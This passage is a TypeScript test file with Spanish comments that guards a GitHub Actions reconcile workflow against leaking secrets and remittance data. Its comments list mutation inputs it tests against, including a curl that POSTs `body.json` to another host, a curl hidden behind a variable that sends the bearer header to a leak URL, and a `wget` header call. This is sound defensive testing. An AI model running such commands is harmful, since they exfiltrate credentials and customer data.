// Tests — candado ESTATICO del productor de POST /api/admin/reconcile-orphans (WKH-328 parte B).
// Patron: no-evm-surface.test.ts (barrido de texto + exclusion por ruta exacta),
// readme-test-count.test.ts (assertar el MARCADOR antes que el valor) y
// prepared-claims-guard.static.test.ts (barrido por TEXTO COMPLETO, nunca por linea).
//
// 🔴 POR QUE EXISTE. `npm run lint` es `biome lint src app scripts`: NO mira `.github/`. Los dos
// `tsc` tampoco (tsconfig.json es la app, tsconfig.scripts.json es scripts/). Sin este archivo, el
// workflow seria el UNICO artefacto de esta HU sin ninguna verificacion mecanica: un typo en el
// nombre del secreto, o alguien que "simplifica" el curl y le saca el chequeo de status, pasaria
// `npm run qa` entero en verde.
//
// ══════════════════════════════════════════════════════════════════════════════════════════════════
// 🔴 EL PERIMETRO DE ESTE CANDADO. LEELO ANTES DE APOYARTE EN SU VERDE.
// ══════════════════════════════════════════════════════════════════════════════════════════════════
// Esto es un MATCHER DE TEXTO sobre un YAML, con un lector de YAML escrito a mano. **No puede ser
// exhaustivo, por construccion**, y la historia lo mide: tres rondas de revision adversarial, y en
// cada una aparecio una forma nueva de esquivar el matcheo de texto (un comentario de linea completa;
// un comentario EN LINEA; un `name:` de paso; un `exit 1` anidado en un `if` que nunca se cumple; una
// bandera de `curl` que no toca el archivo que el candado vigila). Lo unico que probaria de verdad
// que este workflow no filtra datos y falla fuerte es **correrlo**, y para eso hay que pushear.
// ⇒ Asi que este archivo NO se presenta como total. Se presenta con perimetro declarado. Las dos
// frases que decia antes —"REGLA DE ESTE ARCHIVO, **sin excepciones**" y "el invariante cubre las seis
// de una vez y **NO ENVEJECE**"— eran FALSAS y estan corregidas: una lista de lo que se cubre no es
// una prueba de que no haya nada mas.
//
// LO QUE SI CUBRE. Cada linea tiene al menos un mutante que MUERE, con el workflow correcto en verde.
// ⚠️ DONDE ESTA ESA EVIDENCIA, Y QUE PARTE DE ELLA PODES ABRIR VOS. La tabla mutante-por-mutante vive
// en `doc/sdd/042-*/auto-blindaje.md` y en los dos AR, y `.gitignore` ignora `doc/` COMPLETO: desde este
// repo publico esos archivos NO SE PUEDEN ABRIR. Decirlo de otra forma seria mandarte a buscar algo que
// no existe para vos —una version anterior de este parrafo citaba directamente "su reporte" del
// fix-pack #3, y ese reporte no existe en ningun lado—. Lo que SI es verificable desde aca, en un
// comando: los mutantes de la ultima ronda se corrieron contra el workflow cuyo
// `md5sum .github/workflows/reconcile-orphans.yml` es `ac1cb1dc05d2411edd58b8d387344bd9`. Si no coincide con el
// del arbol que estas leyendo, el `.yml` cambio despues de que se midio y esta lista hay que volver a
// medirla.
// ⚠️ ESTE NUMERO YA ENVEJECIO UNA VEZ, Y FUE EN EL COMMIT QUE LO ESCRIBIO. Decia
// `96a71a72993b995abe47a0e8192d9703`, que es el md5 del `.yml` ANTES del fix-pack #5: ese fix-pack
// edito el `.yml` Y este candado, y actualizo el segundo sin actualizar el primero. O sea que la
// UNICA linea verificable en un comando de todo este parrafo estuvo FALSA, en el archivo cuyo valor
// entero es que sus numeros sean confiables — la misma clase de defecto que la enumeracion vieja de
// `YAML` crudo (mas abajo, en la lista de los tres niveles), y lo midio el F4.
// ⚠️ Y NADA LO SOSTIENE: ninguna asercion compara este md5 contra el archivo, asi que se vuelve a
// poner viejo con la proxima edicion del `.yml`, en silencio. No haberla puesto es deliberado —una
// asercion asi pondria la suite ROJA en toda edicion legitima del workflow— y el precio esta
// declarado aca: este renglon hay que actualizarlo A MANO cada vez que el `.yml` cambie.
// LA DIRECCION DEL ERROR SE CONSERVA, y es lo que lo vuelve una molestia y no un agujero: un md5
// viejo manda a RE-MEDIR una lista que quiza no hacia falta re-medir (falsa alarma), nunca a dar por
// medido algo que no se midio (falsa confianza). Corre el comando antes de apoyarte en la lista.
// La UNICA excepcion, dicha: la no-regresion de `route.ts` (ultima linea) no tiene mutante propio,
// porque mutar `route.ts` esta fuera del Scope IN de esta HU.
//   · Estructura: que exista `jobs.<job>.steps[i].run` —lo que GitHub lee— y no solo el texto. Un
//     `jobss:`, un segundo job, o un paso convertido a `uses:` ponen T-042B-0 rojo.
//   · Que los triggers sean EXACTAMENTE `schedule` + `workflow_dispatch`, y la cadencia sea la misma
//     string en el YAML, el runbook y `.env.example` (fuente unica: el `cron:` del YAML).
//   · Que el secreto viaje en un header, alimentado por `env:`, y NUNCA en la URL ni en texto plano.
//   · Que el DESTINO del secreto este fijado: host y esquema cruzados con el `.yml`, el runbook y el
//     arbol de la app, Y que la comparacion corra ANTES del `curl` —no solo que exista en algun lugar
//     del `run:`— (T-042B-15).
//   · Que el argv de CADA `curl` que invoque CUALQUIERA de los pasos —no solo el primero, y no solo
//     los del paso L1— sea una LISTA BLANCA, en las dos direcciones (ninguna bandera de mas, ninguna
//     obligatoria de menos), y que el VALOR del techo `--max-time` sea el mismo numero que declara el
//     runbook, no solo que la bandera este.
//     ⚠️ ESTA LINEA DECIA "CADA `curl` que EL PASO invoque" Y ERA FALSA: el barrido corria sobre L1 y
//     solo L1, asi que un `curl -sS -X POST --data-binary @body.json "<otro host>"` puesto en el
//     SEGUNDO paso pasaba 17/17 EN VERDE (lo midio el F4; el mismo comando en L1 moria). Ahora corre
//     sobre los `run:` de todos los pasos, y las dos direcciones estan medidas en T-042B-15.
//   · Que cada anotacion `::error` vaya seguida de un corte `exit 1` **INCONDICIONAL EN SU NIVEL** —no
//     "presente en el bloque"— y que no haya ningun `exit 0`.
//   · Que ninguna de las nueve formas enumeradas de imprimir el cuerpo este en el shell, y que TODA
//     invocacion de `jq` sea una de las cinco lecturas de agregados permitidas (lista blanca).
//   · Que los comentarios —de linea completa Y en linea— no puedan ni satisfacer ni violar ninguna
//     asercion, y que el `name:` de un paso tampoco (es configuracion, no codigo).
//   · No-regresion del endpoint: `route.ts` sigue con solo `POST`, una `markOutcome` y cero `fetch`.
//
// LO QUE **NO** CUBRE — la lista explicita, no "etcetera":
//   1. QUE EL SCHEDULE ESTE REGISTRADO EN GITHUB. No ejecuta el workflow, no habla con GitHub. El .yml
//      commiteado es la INTENCION; lo unico que prueba el registro es una corrida cuyo evento sea
//      `schedule` (`gh run list --workflow=reconcile-orphans.yml --json event`). Ni un
//      `gh workflow run` verde (queda con evento `workflow_dispatch`) ni un HTTP 200 (que prueba el
//      endpoint, no el productor) cuentan. Y no prueba que el cron CORRA: la ausencia de corridas es
//      invisible y esta HU no entrega heartbeat (ver el item 1 de "que NO mide" del propio workflow).
//   2. EL SCHEMA DE GITHUB ACTIONS. Lo que pasa en verde es la estructura correcta con un VALOR
//      invalido: un `runs-on:` inexistente, un `timeout-minutes: 0`, o un `run: >` (escalar plegado)
//      que ROMPE el script — los tres medidos. El parser de GitHub no esta disponible offline y la
//      libreria `yaml` de `node_modules` es solo una dependencia TRANSITIVA (ver `bloqueAnidado`).
//   3. NO HAY META-TEST DE ESTE ARCHIVO. Un mutante sobre el candado mismo —borrar un `expect`,
//      relajar un regex— no lo mide NADA: `npm run lint` no mira `.github/` (que es la razon por la que
//      el candado existe) y nada mira si el candado sigue teniendo dientes. Las sondas de calibracion
//      de T-042B-8, T-042B-9, T-042B-15 y T-042B-16 acotan el riesgo (un lector roto se delata en su
//      propia sonda) pero NO son un meta-test. Es un limite estructural, no un atajo.
//      ⚠️ MEDIDO EN LOS DOS SENTIDOS, para no dejarlo en una afirmacion de memoria. LO QUE NO SE DELATA:
//      borrar la asercion de ORDEN de la guarda de host, y borrar el cruce del techo `--max-time` con el
//      runbook — los dos dejan la suite en 17/17, o sea que los dos arreglos de esa ronda se pueden
//      revertir en silencio. Y EL ARREGLO DEL FIX-PACK #5 SE DELATA A MEDIAS, dicho con precision: volver
//      el barrido de la lista blanca a `argvsDelCurl(L1)` deja la suite en 17/17 CON EL `.yml` CORRECTO
//      (medido), porque su unico `curl` vive en L1 y entonces no hay diferencia que ver; lo que si muere
//      es esa reversion CUANDO ADEMAS hay un `curl` fuera de L1 (medido: 16/17), porque el conteo de
//      invocaciones escaneadas se cruza contra las lineas de invocacion de TODO el `SHELL`. O sea: el
//      cruce protege el caso que importa —el agujero abierto— y no protege la reversion en frio.
//      Y EL OTRO ARREGLO DEL FIX-PACK #5 —el localizador de T-042B-8, que paso de
//      `L1.indexOf("-z ") < L1.indexOf("curl")` a buscar POR LINEA con `CURL_INVOCACION`— SE DELATA
//      IGUAL DE POCO, y revertirlo NO ES SOLO UN RIESGO DE FALSO ROJO. Tres inputs, medidos:
//        · la reversion SOLA, con el `.yml` CORRECTO: 17/17 EN VERDE. Nadie la ve.
//        · la reversion + un `echo "diagnostico: si el curl falla, mira el runbook"` arriba del
//          `run:` (workflow por lo demas CORRECTO): 16/17, `expected 107 to be less than 63` ⇒ FALSO
//          ROJO. Es la mitad que ya estaba escrita, en el comentario de T-042B-8.
//        · la reversion + un `if [ -z "${GITHUB_RUN_ID:-}" ]` de senuelo ANTES del curl, con el
//          chequeo real del secreto movido a DESPUES: 17/17 EN VERDE ⇒ FALSO VERDE, con el POST
//          saliendo antes de que nadie verifique que el secreto existe. Con el localizador arreglado
//          ese mismo input MUERE 16/17 (`expected 33 to be less than 14`).
//      O sea que el `indexOf` crudo no se ancla solo en la palabra `curl` de un mensaje: se ancla
//      tambien en CUALQUIER `-z ` del script, y no en el del secreto. La reversion pide un segundo
//      renglon para volverse peligrosa —igual que `R1` pide `K1`— y ese segundo renglon es una linea
//      de shell que nadie tiene motivo para mirar dos veces.
//      LO QUE SI SE DELATA SIEMPRE, porque hay una sonda que lo mira: volver
//      `CURL_INVOCACION` al `/\bcurl\b/` ingenuo, o volver el lector a leer solo el PRIMER `curl`, ponen
//      T-042B-15 ROJO. La diferencia entre las dos mitades es exactamente "¿hay una sonda que ejercite
//      este lector?", y es la razon por la que cada lector de este archivo tiene la suya.
//   4. LAS OTRAS VIAS DE LEER `body.json`. La lista blanca cubre `jq`; siguen pasando en verde
//      `head -c 300 body.json`, `head -20 body.json >> "$GITHUB_STEP_SUMMARY"`, `$(cat < body.json)`,
//      un `while read < body.json`, un `python3 -c` que imprima `['items']` y un `set -x`. Medidos uno
//      por uno: cuatro en el AR it2, y dos (`head -c 300 body.json` y `set -x`) re-medidos en el
//      fix-pack #3, donde SOBREVIVEN a proposito — un limite declarado que nadie volvio a medir es un
//      limite que puede haberse cerrado o agrandado sin que nadie se enterara.
//      ⚠️ CINCO de los seis publican el archivo; el `set -x` NO, y decir "los seis" era FALSO. Medido con
//      un `body.json` con IDs marcados: `head -c 300 body.json` ⇒ el ID marcado aparece en el log;
//      `set -x` ⇒ CERO apariciones del ID y CERO de `items`, porque xtrace ecoa el COMANDO y las cinco
//      asignaciones de agregados, nunca el contenido del archivo (es lo que dice, bien, el comentario de
//      T-042B-10, 700 lineas mas abajo: las dos frases se contradecian en el mismo archivo). La direccion
//      del error era conservadora —asustaba mas de lo que corresponde— y aun asi hay que corregirla: un
//      perimetro que exagera un item pierde autoridad sobre los otros cinco, que son ciertos. El que hay
//      que mirar de los seis es `head -c 300 body.json`.
//      ⚠️ Y LOS SEIS SON FORMAS DE **IMPRIMIR**, QUE NO ES LA UNICA FORMA DE PERDER EL ARCHIVO. La
//      septima —`curl … --data-binary @body.json "<otro host>"`, que EXFILTRA en vez de imprimir— NO
//      esta en esta lista y NO sobrevive: la mata la lista blanca del argv de T-042B-15, que desde el
//      fix-pack #5 corre sobre los `run:` de TODOS los pasos (medido en las dos direcciones: en L2 y
//      en L1). Que estuviera abierta desde L2 fue el bloqueante del F4, y la causa era el alcance del
//      barrido, no la lista de literales de este item.
//   5. LA DIRECCION ESPEJO DEL INVARIANTE: verifica **anotacion ⇒ corte** y NADA verifica
//      **corte ⇒ anotacion**. Es deliberado, y su consecuencia esta escrita: `jq -r` sobre un cuerpo
//      que no es JSON sale **5**, asi que un 200 con una pagina de error HTML del CDN mata L2 por
//      `set -e` **sin ninguna anotacion `::error`** ⇒ EL JOB PUEDE FALLAR SIN DECIR POR QUE, y ese rojo
//      queda fuera de la tabla de codigos del runbook. Cerrarlo bien pide un `trap … ERR` en el `.yml`
//      (que ademas colisiona con este mismo invariante, porque la linea del trap contiene `::error` sin
//      corte detras), asi que se DECLARA en vez de improvisarse. El runbook lo dice en
//      "un rojo sin anotacion", con que hacer cuando pase.
//   6. `permissions: {}` NO ESTA ATADO: cambiarlo a `write-all` pasa en verde. El impacto esta acotado
//      porque T-042B-0 exige exactamente dos pasos con `run:` (ninguna action de terceros puede entrar
//      sin ponerlo rojo), pero el candado no existe.
//   7. `set +e` suelto, un `if` de UN RENGLON (`if …; then exit 1; fi`) y mover `concurrency` a nivel
//      de job: el primero no tiene candado; los otros dos dan ROJO con un workflow valido (falso rojo
//      en la direccion visible). Estan medidos y dichos, no descubiertos.
//   8. QUE EL WORKFLOW HAGA LO QUE DICE. Un `sed` que reescriba el YAML con otra sintaxis igualmente
//      valida lo pasa en verde. Es un candado ANTI-REGRESION sobre el texto, no una prueba de
//      funcionamiento.
//   9. EL ORDEN DEL RESTO DEL SCRIPT, Y CUALQUIER COMANDO QUE NO SEA `curl` EN POSICION DE COMANDO.
//      Este item existe porque el CR encontro que los items 1..8 se leian como lista CERRADA y le
//      faltaba justo la clase mas grave: el secreto saliendo a otro host. Los dos inputs que midio —la
//      validacion de host movida a DESPUES del `curl`, y un SEGUNDO `curl` con el mismo header apuntando
//      a otro dominio— pasaban 17/17 EN VERDE y ahora los dos MUEREN (T-042B-15, con calibracion en las
//      dos direcciones). El F4 encontro un TERCERO con el mismo metodo —un `curl … --data-binary
//      @body.json "<otro host>"` en el SEGUNDO paso, que exfiltra los IDs de correlacion, 17/17 en
//      verde— y ese TAMBIEN MUERE desde el fix-pack #5: el barrido dejo de correr sobre L1 y solo L1.
//      ⚠️ ASI QUE ESTE ITEM YA NO DICE "cualquier comando que no sea `curl` DEL PRIMER PASO". Dice
//      `curl` EN POSICION DE COMANDO, EN CUALQUIER PASO. Lo que queda afuera, con su input medido:
//      (a) EL ORDEN SE VERIFICA PARA DOS COSAS Y NADA MAS: el chequeo de secreto vacio (T-042B-8) y la
//          comparacion de host (T-042B-15), las dos contra el `curl`. Reordenar cualquier otra cosa pasa
//          en verde — medido: mover el bloque que escribe el resumen a ANTES de las cinco lecturas de
//          agregados ROMPE el paso (las variables no existen todavia y `set -u` lo mata) y la suite queda
//          en 17/17.
//      (b) UN `curl` QUE NO ESTE EN POSICION DE COMANDO NO LO VE NADIE, y ningun otro programa que mande
//          datos afuera tampoco — EN NINGUNO DE LOS DOS PASOS. Lo que cambio en el fix-pack #5 es el
//          ALCANCE del barrido (ya no es "el primer paso"), no el CRITERIO: sigue siendo "el token
//          `curl` en posicion de comando". Medidos, y los dos SOBREVIVEN en verde: `c=curl` y despues
//          `$c -sS -X POST -H "authorization: Bearer <la env>" "$fuga"` (el comando detras de una
//          variable; lo mismo valdria un `eval`, un `xargs` o un `sh -c`), y un `wget --header=…` contra
//          otro host. Los dos se re-midieron en el paso L2 —el que el barrido no miraba— despues del
//          arreglo, y los dos siguen en 17/17: cerrar el alcance NO cierra esta familia.
//          Lo que la cerraria es el mismo instrumento del item 4: LISTA BLANCA DEL PRIMER TOKEN DE CADA
//          LINEA del `run:`, no lista negra de nombres de programas. Es una HU, no un fix-pack, y hasta
//          que exista lo unico que lo caza es que alguien LEA el diff.
//
// ⚠️ TRAMPA RESUELTA A PROPOSITO, Y EN LOS DOS SENTIDOS — LOS COMENTARIOS NO SON CONFIGURACION. El
// encabezado del workflow EXPLICA por que no tiene trigger `pull_request`, asi que esa palabra aparece
// DOS veces en el archivo, en prosa: un barrido del texto completo buscandola daria rojo con el
// workflow correcto. Y la version PELIGROSA de la misma trampa, medida: un comentario tambien
// SATISFACE una asercion que exige que algo ESTE. El comentario `# -o body.json ⇒ el cuerpo va a un
// ARCHIVO` alcanzaba para que `expect(L1).toMatch(/-o\s+body\.json/)` pasara con el `-o` BORRADO del
// curl — o sea, con el body (que lleva remittanceId / quoteId / payoutId de remesas REALES)
// imprimiendose en el log de un repo PUBLICO.
// ⇒ REGLA DE ESTE ARCHIVO: toda asercion sobre lo que el workflow **ejecuta** corre contra el codigo,
// nunca contra el archivo crudo, y hay TRES niveles a proposito:
//   · `SHELL` = los `run:` de los pasos, sin comentarios de linea completa NI en linea. Es lo unico
//     que se ejecuta, y es contra esto que van las listas negras y blancas de fuga de datos.
//   · `CODIGO` = todo lo que cuelga de `jobs:`, sin comentarios de linea completa NI en linea —
//     incluye configuracion (`env:`, `name:`, `with:`). Va aca lo que puede vivir fuera del `run:`,
//     como un `Bearer` en texto plano.
//   · `YAML` crudo lo tocan SOLO cuatro cosas, y a proposito: el `name:` del workflow, el `cron:`, el
//     conteo de lineas de T-042B-0 y el `timeout-minutes:` de T-042B-11. (Decia "tres" y eran cuatro: el
//     cuarto se escribio despues y la enumeracion no se actualizo. La REGLA se respetaba —un comentario
//     no satisface `/^\s+timeout-minutes:\s*\d+/m`, medido: comentar la linea MATA T-042B-11— pero en un
//     archivo cuyo valor entero es que sus enumeraciones sean confiables, una enumeracion vieja es de la
//     misma clase que las frases falsas que ya se corrigieron arriba.)
// La eleccion entre los tres NO es estilistica: `CODIGO` en lugar de `SHELL` produjo el 4to falso rojo
// de esta serie (un `name:` de paso con la palabra `jq`), y `YAML` en lugar de `CODIGO` produjo los
// tres primeros. Es la misma leccion que la trampa 3 de no-evm-surface.test.ts —ese archivo SI esta en el
// repo y se puede abrir— y quedo escrita tambien en `doc/sdd/042-*/auto-blindaje.md`, que `.gitignore` NO
// publica: si estas leyendo esto desde el repo publico, ese segundo puntero no te sirve, y el que si te
// sirve es no-evm-surface.test.ts.
//
// ⚠️ POR QUE NO HAY BARRIDO DE DIRECTORIOS ACA. Este archivo lee CINCO rutas fijas. No recorre
// ningun arbol, asi que no puede auto-dispararse con los literales que persigue (`.items`,
// `cat body.json`) y no necesita excluirse a si mismo. Si algun dia se le agrega un barrido, la
// exclusion tiene que ser por RUTA EXACTA y nunca por glob `*.test.ts`, que cegaria toda la suite.
import { existsSync, readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";

const ROOT = process.cwd();

const WORKFLOW_REL = ".github/workflows/reconcile-orphans.yml";
const RUNBOOK_REL = "docs/runbook-reconcile-orphans.md";
const ROUTE_REL = "app/api/admin/reconcile-orphans/route.ts";

/** Lectura defensiva: si el archivo no existe devuelve "" en vez de tirar en tiempo de import. Sin
 *  esto, borrar el workflow haria que el archivo ENTERO explote al colectar y ningun `it` correria
 *  — y lo que CD-8 pide comprobar a mano es que T-042B-0 SE PONGA ROJO, no que la suite se caiga. */
function leer(rel: string): string {
  const full = path.join(ROOT, rel);
  return existsSync(full) ? readFileSync(full, "utf8") : "";
}

const YAML = leer(WORKFLOW_REL);
const RUNBOOK = leer(RUNBOOK_REL);
const ROUTE = leer(ROUTE_REL);
const GITIGNORE = leer(".gitignore");
const ENV_EXAMPLE = leer(".env.example");

/** Corta una linea en el primer `#` que ABRE comentario de shell: fuera de comillas y al principio de
 *  una palabra (principio de linea o precedido por un blanco). Es la regla del shell, y es la que
 *  hace que `echo "algo # con numeral"` y la expansion `${RECONCILE_URL#*://}` —las dos en este
 *  workflow— queden intactas, que es exactamente lo que un `l.split("#")[0]` rompe. */
function sinComentarioEnLinea(linea: string): string {
  let comilla = "";
  for (let i = 0; i < linea.length; i++) {
    const c = linea[i] as string;
    if (comilla !== "") {
      if (c === comilla) comilla = "";
      continue;
    }
    if (c === '"' || c === "'") {
      comilla = c;
      continue;
    }
    if (c === "#" && (i === 0 || /\s/.test(linea[i - 1] as string))) return linea.slice(0, i).trimEnd();
  }
  return linea;
}

/** Saca los comentarios: los de LINEA COMPLETA **y** los que van A MITAD DE LINEA.
 *
 *  🔴 POR QUE LOS DOS, Y POR QUE ARREGLAR UNO SOLO NO ALCANZA. La version anterior filtraba solo
 *  `/^\s*#/`, y el AR de la iteracion 2 lo midio en las DOS direcciones, las dos con 2801/2801 en
 *  verde:
 *    · FALSO VERDE: borrar `-o body.json` del `curl` y agregar al final de otra linea el comentario
 *      `  # el cuerpo ya no va a -o body.json` dejaba pasar `expect(L1).toMatch(/-o\s+body\.json/)`.
 *      Sin `-o`, `curl` escribe el cuerpo en stdout y `code="$(curl …)"` lo captura, asi que los
 *      `remittanceId` / `quoteId` / `payoutId` de remesas REALES salen al `::error`, al resumen y al
 *      log de un repo PUBLICO — con el candado en verde.
 *    · FALSO ROJO: un `  # nunca cat body.json` al final de una linea ponia T-042B-10 rojo con el
 *      workflow 100% CORRECTO. Y escribir un comentario en linea es una edicion legitima; el riesgo
 *      no es el rojo, es que alguien con la suite roja y el workflow bien RELAJE el patron.
 *  Las dos direcciones salen del mismo hueco, asi que hay que DESPOJAR el comentario, no prohibirlo:
 *  prohibir el `#` a mitad de linea cerraria el falso verde y dejaria el falso rojo en pie.
 *
 *  ⚠️ EL BORDE DE ESTE DESPOJADOR, declarado: no entiende el escape `\#` ni los heredocs. Ninguno de
 *  los dos aparece en este YAML; si aparecieran, el efecto seria un falso ROJO (una linea recortada de
 *  mas ⇒ una asercion de presencia que no encuentra lo que busca), que es visible, y no un falso
 *  verde, que no lo es. Calibrado en las dos direcciones en T-042B-16. */
function sinComentarios(texto: string): string {
  return texto
    .split("\n")
    .filter((l) => !/^\s*#/.test(l))
    .map(sinComentarioEnLinea)
    .join("\n");
}

function sangriaDe(linea: string): number {
  return linea.length - linea.trimStart().length;
}

/** Las lineas HIJAS de una clave ANIDADA, navegando por INDENTACION y sobre el texto SIN comentarios.
 *  Devuelve "" si algun tramo de `ruta` no esta a la sangria que le toca.
 *
 *  🔴 POR QUE ESTO Y NO UN BARRIDO DE TEXTO. Un barrido no distingue "esta escrito en el archivo" de
 *  "esta en el lugar donde GitHub lo va a leer". Medido: renombrar `jobs:` a `jobss:` deja un YAML
 *  sintacticamente VALIDO (`yaml.safe_load` lo lee sin chistar) que GitHub NO PUEDE REGISTRAR —o sea,
 *  el cron no corre nunca— y el barrido de texto lo aprobaba 15/15. Con la navegacion por estructura
 *  la ruta se corta y el bloque queda "", que es lo que T-042B-0 pone rojo.
 *
 *  ⚠️ POR QUE NO SE IMPORTA UN PARSER DE YAML DE VERDAD. `yaml@2.9.0` esta en `node_modules`, pero
 *  SOLO como dependencia TRANSITIVA (`npm ls yaml` ⇒ tailwindcss → postcss-load-config, y
 *  @solana/wallet-adapter-react → react-native → metro-config). Importarla desde un test la vuelve una
 *  dependencia FANTASMA: el dia que tailwind cambie de loader, este archivo explota AL IMPORTAR y se
 *  cae la suite entera por una razon que no tiene nada que ver con el workflow. Declararla en
 *  package.json esta fuera del Scope IN de esta HU. Asi que se navega a mano, y el precio esta
 *  declarado en el encabezado (esto NO valida el schema de GitHub) y calibrado en las dos direcciones
 *  en T-042B-0.
 *
 *  ⚠️ Las lineas en blanco se descartan antes de navegar: dentro de un block scalar `run: |` valen
 *  como contenido, pero su sangria es 0 y cortarian la navegacion en el primer renglon vacio del
 *  script. Para las aserciones de este archivo (regex sobre el codigo del shell) es indiferente. */
function bloqueAnidado(texto: string, ruta: readonly string[]): string {
  let lineas = sinComentarios(texto)
    .split("\n")
    .filter((l) => l.trim() !== "");
  let sangria = 0;
  for (const clave of ruta) {
    const i = lineas.findIndex(
      (l) =>
        sangriaDe(l) === sangria &&
        (l.trim() === `${clave}:` || l.trim().startsWith(`${clave}: `)),
    );
    if (i === -1) return "";
    let j = i + 1;
    while (j < lineas.length && sangriaDe(lineas[j] as string) > sangria) j++;
    lineas = lineas.slice(i + 1, j);
    if (lineas.length === 0) return "";
    sangria = sangriaDe(lineas[0] as string);
  }
  return lineas.join("\n");
}

/** Los nombres de job bajo `jobs:`. Se DERIVAN, no se hardcodean: renombrar el job es legitimo para
 *  GitHub y no tiene por que poner este candado rojo. Lo que no es legitimo es que `jobs:` no exista
 *  (no se registra) o que aparezca un segundo job que nadie reviso. */
function nombresDeJob(): readonly string[] {
  const jobs = bloqueAnidado(YAML, ["jobs"]);
  if (jobs === "") return [];
  const lineas = jobs.split("\n");
  const sangria = sangriaDe(lineas[0] as string);
  return lineas
    .filter((l) => sangriaDe(l) === sangria)
    .map((l) => /^([A-Za-z0-9_-]+):/.exec(l.trim())?.[1] ?? "")
    .filter((n) => n !== "");
}

const JOBS = nombresDeJob();
const JOB = JOBS[0] ?? "";

/** El CODIGO del workflow: todo lo que cuelga de `jobs:`, sin una sola linea de comentario. Los
 *  barridos de literales prohibidos van contra esto y NUNCA contra el archivo crudo. */
const CODIGO = bloqueAnidado(YAML, ["jobs"]);

type Paso = { readonly nombre: string; readonly crudo: string; readonly run: string };

/** Los pasos de `jobs.<job>.steps`, con su `run:` YA sin comentarios de shell. FUENTE UNICA de todo
 *  lo que se assertea de L1 y L2: si el YAML deja de tener esa ruta la lista queda VACIA, y
 *  T-042B-0 —que va primero— se pone rojo antes de que cualquier otro test asserte sobre "". */
function pasosDelJob(): readonly Paso[] {
  const steps = bloqueAnidado(YAML, ["jobs", JOB, "steps"]);
  if (steps === "") return [];
  const lineas = steps.split("\n");
  const sangriaItem = sangriaDe(lineas[0] as string);
  const pasos: { nombre: string; crudo: string[]; run: string[] }[] = [];
  let enRun = false;
  for (const l of lineas) {
    const t = l.trim();
    const s = sangriaDe(l);
    if (s === sangriaItem && t.startsWith("- ")) {
      pasos.push({ nombre: "", crudo: [], run: [] });
      enRun = false;
    }
    const actual = pasos[pasos.length - 1];
    if (actual === undefined) continue;
    actual.crudo.push(l);
    // Una clave del paso: `- name: x` y `name: x` son la misma cosa, el `- ` ocupa dos columnas.
    if (s === sangriaItem || s === sangriaItem + 2) {
      enRun = false;
      const clave = /^(?:- )?([a-z-]+):(.*)$/.exec(t);
      if (clave?.[1] === "name") actual.nombre = (clave[2] as string).trim();
      if (clave?.[1] === "run") enRun = true;
      continue;
    }
    if (enRun) actual.run.push(l);
  }
  return pasos.map((p) => ({ nombre: p.nombre, crudo: p.crudo.join("\n"), run: p.run.join("\n") }));
}

const PASOS = pasosDelJob();
const L1 = PASOS[0]?.run ?? "";
const L2 = PASOS[1]?.run ?? "";

/** El SHELL del workflow: la concatenacion de los `run:` de los pasos, o sea LO UNICO QUE SE EJECUTA.
 *
 *  🔴 POR QUE NO ALCANZA CON `CODIGO`, medido por el AR de la iteracion 2: renombrar el paso 2 a
 *  `- name: sin hallazgos que revisar (jq de los cinco agregados)` deja el workflow FUNCIONALMENTE
 *  IDENTICO (un `name:` es una etiqueta) y ponia T-042B-10 ROJO. La causa no son los comentarios —un
 *  `name:` es CONFIGURACION, ningun despojador de comentarios lo saca— sino la pregunta: una lista
 *  blanca de lo que el workflow EJECUTA tiene que correr sobre el codigo que se ejecuta, no sobre todo
 *  el texto que cuelga de `jobs:`. Es el 4to falso rojo de la misma familia, y el propio archivo ya
 *  declara que renombrar es legitimo (ver `nombresDeJob`).
 *
 *  ⚠️ Y NO PIERDE COBERTURA, que es la pregunta que hay que hacerse antes de estrechar un barrido: el
 *  unico otro lugar donde un paso puede EJECUTAR algo es un `uses:` con `with: script:`, y T-042B-0
 *  exige EXACTAMENTE dos pasos y que los dos tengan cuerpo `run:` de mas de 100 caracteres, asi que un
 *  tercer paso —o uno de los dos convertido a `uses:`— pone T-042B-0 rojo antes (D3 y D4 del AR mueren
 *  ahi). `CODIGO` se sigue usando para lo que es configuracion (el `Bearer` puede vivir en un `env:` o
 *  en un `with:`, no solo en el `run:`). */
const SHELL = PASOS.map((p) => p.run).join("\n");

/** El bloque `if … ; then … fi` de un `run:` cuya PRIMERA linea matchea `condicion`. Cuenta `if`/`fi`
 *  para no cortar en un anidado. Devuelve "" si no hay ninguno.
 *
 *  🔴 POR QUE EXISTE, y es el corazon de este candado: `expect(L1).toMatch(/exit 1/)` se satisface con
 *  CUALQUIERA de los tres `exit 1` del paso. Medido: cambiar a `exit 0` el `exit 1` del chequeo de
 *  status —o sea, un 401 / 404 / 501 / 503 deja el job en VERDE y el cron pasa a ser decorativo—
 *  dejaba los 15 tests en verde, porque el `exit 1` del secreto vacio seguia escrito unas lineas mas
 *  arriba. Un chequeo puede quedar PRESENTE Y SIN DIENTES, y es exactamente la mutacion que el runbook
 *  predice como tentacion humana ("un job cronicamente rojo entrena a ignorarlo… la decision no es
 *  bajarle el volumen"). Asi que el corte se assertea DENTRO de su condicion, no suelto en el paso. */
function bloqueIf(run: string, condicion: RegExp): string {
  const lineas = run.split("\n");
  for (let i = 0; i < lineas.length; i++) {
    const cabeza = lineas[i] as string;
    if (!/^\s*if\b/.test(cabeza) || !condicion.test(cabeza)) continue;
    let profundidad = 0;
    for (let j = i; j < lineas.length; j++) {
      const t = (lineas[j] as string).trim();
      if (/^if\b/.test(t)) profundidad++;
      if (/^fi\b/.test(t)) {
        profundidad--;
        if (profundidad === 0) return lineas.slice(i, j + 1).join("\n");
      }
    }
    return "";
  }
  return "";
}

/** Los renglones que ABREN y CIERRAN un bloque condicional o de repeticion del shell. `{ … }` y
 *  `( … )` NO estan a proposito: un grupo de llaves se ejecuta SIEMPRE que el flujo llega a el —este
 *  workflow usa uno para escribir el resumen— asi que no condiciona nada. */
const ABRE_BLOQUE = /^\s*(if|case|while|until|for)\b/;
const CIERRA_BLOQUE = /^\s*(fi|esac|done)\b/;

/** El primer `exit N` que se ejecuta SIEMPRE que el flujo llega a `desde`: el que esta a profundidad
 *  CERO de bloques abiertos entre `desde` y `hasta`. Devuelve "" si no hay ninguno.
 *
 *  🔴 POR QUE PROFUNDIDAD Y NO PRESENCIA. Es el agujero que el AR de la iteracion 2 midio dos veces,
 *  las dos con **2801/2801 en verde**: envolver el `exit 1` del chequeo de status en
 *  `if [ "$SILENCIAR" = "si" ]; then exit 1; fi` —un interruptor por variable de entorno, que es la
